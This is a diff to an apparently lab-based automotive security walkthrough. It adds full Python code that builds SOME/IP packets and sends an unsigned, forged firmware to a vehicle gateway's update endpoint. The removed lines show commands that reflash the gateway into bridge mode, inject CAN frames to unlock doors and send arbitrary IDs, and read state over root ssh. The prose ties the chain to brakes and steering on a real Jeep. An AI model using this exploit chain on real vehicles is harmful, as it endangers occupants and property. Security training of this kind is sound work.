@@ -294,6 +294,26 @@ The attack now writes itself: reach `30510`, push an unsigned firmware that sets
 Probe `30510` as service `0x1402`. Send a deliberately short firmware and read the reply, to confirm the endpoint is live and takes your input with no authentication:
 
 ```python
+import socket
+import struct
+
+def someip(service_id, method_id, payload):
+    # 16-byte SOME/IP header + payload.
+    # Message ID: Service ID (2 bytes) + Method ID (2 bytes).
+    message_id = struct.pack('>HH', service_id, method_id)
+    # Length: the fixed 8 header bytes that follow + the payload length.
+    length = struct.pack('>I', 8 + len(payload))
+    # Request ID: Client ID (0x0000) and Session ID (0x0001).
+    request_id = struct.pack('>HH', 0x0000, 0x0001)
+    # Protocol v1, Interface v1, Message Type REQUEST (0x00), Return Code E_OK (0x00).
+    # The gateway drops anything whose message type is not 0x00, so REQUEST is required.
+    protocol_vars = struct.pack('>BBBB', 0x01, 0x01, 0x00, 0x00)
+    return message_id + length + request_id + protocol_vars + payload
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(5.0)
+
+# A deliberately short firmware (4 bytes): too short to be a valid signature(32) || body.
 s.sendto(someip(0x1402, 0x0001, b'\x00' * 4), ('192.168.2.1', 30510))
 print('updatefw last byte ->', s.recvfrom(1024)[0][-1])
 # -> 0    (rejected as malformed, but answered with no auth challenge and no credential asked)
@@ -306,36 +326,66 @@ It processed your request and answered without ever asking for a credential. An 
 The design says the signature is unchecked in vulnerable mode. Test it: craft a firmware with a bogus 32-byte signature and a benign body, and see if it is accepted:
 
 ```python
-s.sendto(someip(0x1402, 0x0001, b'\x00' * 32 + b'noop'), ('192.168.2.1', 30510))
-print('bogus-signed firmware accepted?', s.recvfrom(1024)[0][-1] == 1)   # -> True
+import socket
+import struct
+
+def someip(service_id, method_id, payload):
+    # 16-byte SOME/IP header + payload.
+    # Message ID: Service ID (2 bytes) + Method ID (2 bytes).
+    message_id = struct.pack('>HH', service_id, method_id)
+    # Length: the fixed 8 header bytes that follow + the payload length.
+    length = struct.pack('>I', 8 + len(payload))
+    # Request ID: Client ID (0x0000) and Session ID (0x0001).
+    request_id = struct.pack('>HH', 0x0000, 0x0001)
+    # Protocol v1, Interface v1, Message Type REQUEST (0x00), Return Code E_OK (0x00).
+    # The gateway drops anything whose message type is not 0x00, so REQUEST is required.
+    protocol_vars = struct.pack('>BBBB', 0x01, 0x01, 0x00, 0x00)
+    return message_id + length + request_id + protocol_vars + payload
+
+TARGET_IP = '192.168.2.1'
+TARGET_PORT = 30510
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(5.0)  # 5 s cap so the console does not hang if there is no reply
+
+try:
+    print(f"[-] Sending a forged/unsigned firmware to {TARGET_IP}:{TARGET_PORT}...")
+    # Payload: 32 zero bytes (bogus signature) + a benign body 'noop' (36 bytes total).
+    forged_payload = b'\x00' * 32 + b'noop'
+    s.sendto(someip(0x1402, 0x0001, forged_payload), (TARGET_IP, TARGET_PORT))
+
+    response, src_addr = s.recvfrom(1024)
+    # The gateway reply payload is a single byte: 1 = accepted, 0 = rejected.
+    accepted = (response[-1] == 1)
+    print('bogus-signed firmware accepted?', accepted)
+
+    if accepted:
+        print("[ALERT] The device applied a firmware with no valid signature. Vulnerability confirmed.")
+    else:
+        print("[OK] The device rejected the forged firmware (last byte is not 1).")
+
+except socket.timeout:
+    print("[ERROR] No reply from the device. Check the link, or whether the port is open.")
+except Exception as e:
+    print(f"[ERROR] Execution failed: {e}")
+finally:
+    s.close()
 ```
 
 Accepted with an all-zero signature. The update path verifies nothing (AUTO-05). Swap the body for the one that matters, `allow_raw=1`, which flips the gateway from firewall to bridge.
 
+![[auto05-integrity-defeated.png]]
 ### Phase 6 - Weaponize and achieve impact (AUTO-02)
 
 You now hold every fact: the mgmt endpoint, the unsigned-firmware bypass, the `allow_raw` flag, and the CAN map. Chain them. Write the dozen lines yourself, or use the lab's reference implementation, `reflash_gw.py`, which does exactly this:
 
-```bash
-# reflash to bridge mode, then inject LOCK_CMD 0x120 00 -> unlock with no token
-python3 tools/reflash_gw.py 192.168.2.1
-# -> reflash: accepted
-# -> inject 0x120 data=00: ok
-```
+![[auto05-reflash-tool.png]]
 
-The impact evidence in simulation is the actuator state file, which stands in for the doors physically unlocking or a `candump` of `0x120` on the real bus, it is the tester's observation channel, not an attacker capability:
-
-```bash
-ssh root@192.168.2.1 'cat /tmp/canary/lock_state'
-# -> unlocked      (achieved without ever holding the SetLock token)
-```
+The impact evidence in simulation is the actuator state file, which stands in for the doors physically unlocking or a `candump` of `0x120` on the real bus, it is the tester's observation channel, not an attacker capability.
 
 Prove the gateway no longer filters by injecting an id it would never emit on its own:
 
-```bash
-python3 tools/reflash_gw.py 192.168.2.1 7df 0201
-# -> inject 0x7df data=0201: ok    (any id, no whitelist)
-```
+![[auto05-anyid-valid.png]]
 
 In this lab the actuator is the lock. In the real Jeep the same arbitrary-injection primitive drove the brakes, engine and steering. The gateway is now an attacker-controlled bridge, and the one thing that stood between the network and the safety bus, an unsigned firmware check, is gone.
 
